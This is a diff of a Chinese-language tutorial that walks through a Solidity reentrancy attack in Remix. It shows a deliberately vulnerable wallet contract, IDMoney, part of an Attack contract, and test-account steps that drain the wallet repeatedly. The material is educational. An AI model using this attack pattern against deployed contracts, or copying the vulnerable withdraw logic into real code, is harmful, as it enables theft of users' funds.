@@ -1398,17 +1398,17 @@ contract IDMoney{
     mapping (address => uint256) balances;
 
     function IDMoney() {
-        _owner = msg.sender; // 构造函数中的 msg.sender 只能是创建者
+        _owner = msg.sender;
     }
     function deposit() public payable {
         balances[msg.sender] += msg.value;
     }
     function withdraw(address to, uint256 amount) public payable {
-        require(balances[msg.sender] >= amount); // 公共钱包中调用者的余额是否足够
-        require(this.balance >= amount); // 该合约资产是否足够
+        require(balances[msg.sender] >= amount);
+        require(this.balance >= amount);
 
-        to.call.value(amount*10**18)(); // 此处 amount 单位是 wei，这里换算成 ether
-        balances[msg.sender] -= amount*10**18;
+        to.call.value(amount)();
+        balances[msg.sender] -= amount;
     }
     function balanceof(address to) constant returns(uint256){
         return balances[to];
@@ -1448,33 +1448,34 @@ contract IDMoney{
 #### 攻击合约
 
 ```javascript
-pragma solidity ^0.4.19;
+pragma solidity ^0.4.10;
 
-contract IDMoney{
-    address _owner;
-    mapping (address => uint256) balances;
+contract IDMoney {
+    address owner;
+    mapping (address => uint256) balances;  // 记录每个打币者存入的资产情况
 
-    function IDMoney() {
-        _owner = msg.sender;
-    }
-    function deposit() public payable {
-        balances[msg.sender] += msg.value;
-    }
-    function withdraw(address to, uint256 amount) public payable {
-        require(balances[msg.sender] >= amount);
-        require(this.balance >= amount);
+    event withdrawLog(address, uint256);
 
-        to.call.value(amount)();
+    function IDMoney() { owner = msg.sender; }
+    function deposit() payable { balances[msg.sender] += msg.value; }
+    function withdraw(address to, uint256 amount) {
+        require(balances[msg.sender] > amount);
+        require(this.balance > amount);
+
+        withdrawLog(to, amount);  // 打印日志，方便观察 reentrancy
+
+        to.call.value(amount)();  // 使用 call.value()() 进行 ether 转币时，默认会发所有的 Gas 给外部
         balances[msg.sender] -= amount;
     }
-    function balanceof(address to) constant returns(uint256){
-        return balances[to];
-    }
+    function balanceOf() returns (uint256) { return balances[msg.sender]; }
+    function balanceOf(address addr) returns (uint256) { return balances[addr]; }
 }
 
 contract Attack {
     address owner;
     address victim;
+
+    event withdrawLog(uint256, uint256);
 
     modifier ownerOnly { require(owner == msg.sender); _; }
 
@@ -1485,6 +1486,9 @@ contract Attack {
 
     // deposit Ether to IDMoney deployed
     function step1(uint256 amount) ownerOnly payable {
+        
+        withdrawLog(this.balance, amount);
+        
         if (this.balance > amount) {
             victim.call.value(amount)(bytes4(keccak256("deposit()")));
         }
@@ -1514,15 +1518,19 @@ contract Attack {
 
 #### 攻击过程
 
-在 `https://remix.ethereum.org` 编译合约之后，先部署 `IDMoney`
+在 `https://ethereum.github.io/browser-solidity` 或 `https://remix.ethereum.org` 编译合约
 
 ![](pic/blockchain/compile_idmoney.png)
 
-得到 `IDMoney` 合约地址 `0xef55bfac4228981e850936aaf042951f7b146e41`
+使用外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733` 部署 `IDMoney` 合约
 
-![](pic/blockchain/compile_idmoney2.png)
+![](pic/blockchain/deploy_idmoney.png)
 
-向外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 向钱包存入 20 个以太坊，如下所示
+得到 `IDMoney` 合约地址 `0x692a70d2e424a56d2c6c27aa97d1a86395877b3a`
+
+![](pic/blockchain/deploy_idmoney2.png)
+
+向外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 向钱包存入 22 个以太坊，如下所示
 
 ![](pic/blockchain/deposit_idmoney.png)
 
@@ -1530,45 +1538,61 @@ contract Attack {
 
 ![](pic/blockchain/deposit_idmoney2.png)
 
-查看外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 信息，合约中的余额为 20（0 --> 20），同时，账户余额为 79 （99 --> 79）
+通过 `balancaeof`() 查看外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 信息，合约中的余额为 22（0 --> 22），同时，账户余额为 77 （99 --> 77）
 
 ![](pic/blockchain/balanceof_idmoney.png)
 
-可以正常地对外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 进行取现
-
-![1533885926602](pic/blockchain/withdraw_idmoney.png)
-
-查看交易详细信息
-
-![1533886029601](pic/blockchain/withdraw_idmoney2.png)
-
-再次查看外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c`，可以看到合约中的余额为 0
+查看交易信息
 
 ![](pic/blockchain/balanceof_idmoney2.png)
 
+
+
 **WARNING: 切换到外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db ` 之后，才能部署合约 `Attack`**
 
-部署合约 `Attack`
+部署 `Attack` 合约
 
 ![](pic/blockchain/deploy_attack.png)
 
-得到 `Attack` 合约地址 `0x5559291517fd70189de6e56c0f0e97917c9c4cb6 `
+部署合约之后，得到 `Attack` 合约地址 `0x8046085fb6806caa9b19a4cd7b3cd96374dd9573`，同时可以查看到外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db ` 余额变为 97 以太坊
 
 ![](pic/blockchain/deploy_attack2.png)
 
-调用 `setVictim` 设置合约 `IDMoney` 地址，如下所示
+查看交易信息
+
+![](pic/blockchain/deploy_attack3.png)
+
+调用 `setVictim()` 设置合约 `IDMoney` 地址，如下所示
 
 ![](pic/blockchain/set_victim_attack.png)
 
+查看交易信息
+
 ![](pic/blockchain/set_victim_attack2.png)
 
-向外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 向钱包存入 22 个以太坊，然后外部账户 尝试`0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db` 发动攻击，调用 `Attack` 合约中的 `startAttack(10)`，即，外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db` 先向钱包转入 10 个以太坊，然后提取 5 个以太坊
+外部账户`0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db`  尝试发动攻击，调用 `Attack` 合约中的 `startAttack(1000000000000000000)`，即，外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db` 先向钱包转入 1 个以太坊，然后提取 0.5 个以太坊
 
 ![](pic/blockchain/start_attack.png)
 
-![1533892799794](pic/blockchain/start_attack2.png)
+查看交易信息如下
 
+> **备注：**交易信息部分截图如下，注意查看 `logs`，包含 46 条事件日志，第 1 条为 `Attack` 合约打印，剩下的 45 条为 `IDMoney` 合约打印。
 
+![1533927494535](pic/blockchain/start_attack3.png)
+
+调用 `stopAttack()` 停止攻击，销毁 `Attack` 合约，并将合约余额退回到外部账户`0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db` 
+
+![](pic/blockchain/stop_attack.png)
+
+查看交易信息
+
+![](pic/blockchain/stop_attack2.png)
+
+此时，外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db`  的余额如下所示
+
+> **估算思路：**`100` + `0.5 * 45` - `1`，分别为外部账户初始余额，发动攻击提取的以太坊，外部账户存入 `IDMoney` 的以太坊（实际上，后续可以通过 `IDMoney` 合约的提现接口提取出来）
+
+![](pic/blockchain/balanceof_idmoney3.png)
 
 ## 比特币 bitcoin
 
